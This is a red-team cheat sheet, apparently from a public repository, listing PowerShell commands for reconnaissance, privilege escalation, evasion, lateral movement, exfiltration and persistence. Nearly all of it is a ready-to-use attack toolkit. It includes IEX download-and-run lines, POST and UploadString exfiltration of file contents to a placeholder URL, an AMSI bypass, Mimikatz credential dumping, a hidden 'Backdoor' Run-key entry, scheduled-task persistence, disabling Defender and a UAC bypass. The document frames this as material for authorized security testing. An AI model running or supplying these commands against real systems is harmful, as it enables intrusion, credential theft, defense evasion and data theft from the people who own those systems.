# PowerShell Commands for Red Team Operations

This document lists PowerShell commands and techniques commonly used by red teamers during security assessments. These commands cover reconnaissance, privilege escalation, lateral movement, persistence, and exfiltration. Use this knowledge responsibly and only in authorized environments.

**Date:** April 03, 2025  
**Note:** These commands are for educational purposes. Ensure compliance with legal and ethical standards.

---

## Table of Contents
1. [Reconnaissance and Enumeration](#reconnaissance-and-enumeration)
2. [Privilege Escalation](#privilege-escalation)
3. [Payload Execution and Evasion](#payload-execution-and-evasion)
4. [Lateral Movement](#lateral-movement)
5. [Data Exfiltration](#data-exfiltration)
6. [Persistence](#persistence)
7. [Miscellaneous](#miscellaneous)

---

## Reconnaissance and Enumeration

### System Information
- `Get-ComputerInfo`  
  Retrieves detailed system info (OS, hardware, etc.).
- `systeminfo`  
  Displays comprehensive system configuration.

### Processes
- `Get-Process`  
  Lists running processes with details (PID, name, etc.).
- `tasklist /SVC`  
  Shows processes and associated services.

### Network
- `Get-NetIPConfiguration`  
  Displays network adapter details.
- `Get-NetTCPConnection`  
  Lists active TCP connections.
- `Test-NetConnection -ComputerName <target>`  
  Tests connectivity to a remote host.

### Users and Groups
- `Get-LocalUser`  
  Lists local user accounts.
- `Get-LocalGroup`  
  Lists local groups.
- `Get-ADUser -Filter *`  
  Enumerates AD users (requires RSAT).

### Services
- `Get-Service`  
  Lists services and their statuses.
- `Get-CimInstance -ClassName Win32_Service`  
  Retrieves detailed service info.

### Files
- `Get-ChildItem -Recurse -Include *.txt,*.docx`  
  Searches for specific file types.
- `Get-Content <file>`  
  Reads file contents.

---

## Privilege Escalation

### Execution Policy
- `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass`  
  Bypasses script execution restrictions.
- `powershell -ep bypass`  
  Launches PowerShell without policy enforcement.

### UAC Bypass
- `Invoke-FodHelperBypass -Program "powershell"`  
  Uses fodhelper.exe to escalate (requires admin).
- `Start-Process powershell -Verb RunAs`  
  Launches an elevated shell.

### Misconfigurations
- `Get-CimInstance -ClassName Win32_Service | Where-Object {$_.PathName -notlike '*"'}`  
  Finds unquoted service paths.

---

## Payload Execution and Evasion

### In-Memory Execution
- `IEX (New-Object Net.WebClient).DownloadString('http://<url>/script.ps1')`  
  Downloads and runs a script in memory.
- `Invoke-WebRequest -Uri <url> -OutFile <file>`  
  Downloads a file.

### Encoded Commands
- `powershell -enc <base64_string>`  
  Executes Base64-encoded commands.
- `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))`  
  Encodes a command.

### AMSI Bypass
- `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`  
  Disables AMSI to avoid script scanning.

---

## Lateral Movement

### Remote Execution
- `Invoke-Command -ComputerName <target> -ScriptBlock { <command> }`  
  Runs a command remotely (requires WinRM).
- `Enter-PSSession -ComputerName <target>`  
  Starts an interactive remote session.

### Credentials
- `Get-Credential`  
  Prompts for credentials.
- `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'`  
  Dumps credentials (requires Mimikatz).

### Enable RDP
- `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0`  
  Enables RDP.
- `Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'`  
  Opens RDP ports.

---

## Data Exfiltration

### Send Data
- `$data = Get-Content <file>; Invoke-WebRequest -Uri <url> -Method POST -Body $data`  
  Exfiltrates file contents via POST.
- `IEX (New-Object Net.WebClient).UploadString('<url>', (Get-Content <file>))`  
  Uploads data to a server.

### Clipboard
- `Get-Clipboard`  
  Retrieves clipboard contents.

---

## Persistence

### Registry
- `New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'powershell -ep bypass -w hidden -c <command>'`  
  Runs a script at login.

### Scheduled Tasks
- `New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ep bypass -c <command>'`  
  Creates a persistent scheduled task.

---

## Miscellaneous

### Windows Defender
- `Set-MpPreference -DisableRealtimeMonitoring $true`  
  Disables real-time protection (requires admin).

### Kerberos
- `Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/<target>'`  
  Requests a Kerberos ticket.

### Screenshot
- `[Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('screenshot.png')`  
  Captures a screenshot.

---

## Notes
- These commands can be combined with tools like PowerSploit or Empire.
- Obfuscation and in-memory execution are common evasion tactics.
- Always obtain proper authorization before testing.

**Contribute:** Feel free to submit pull requests with additional commands or improvements!
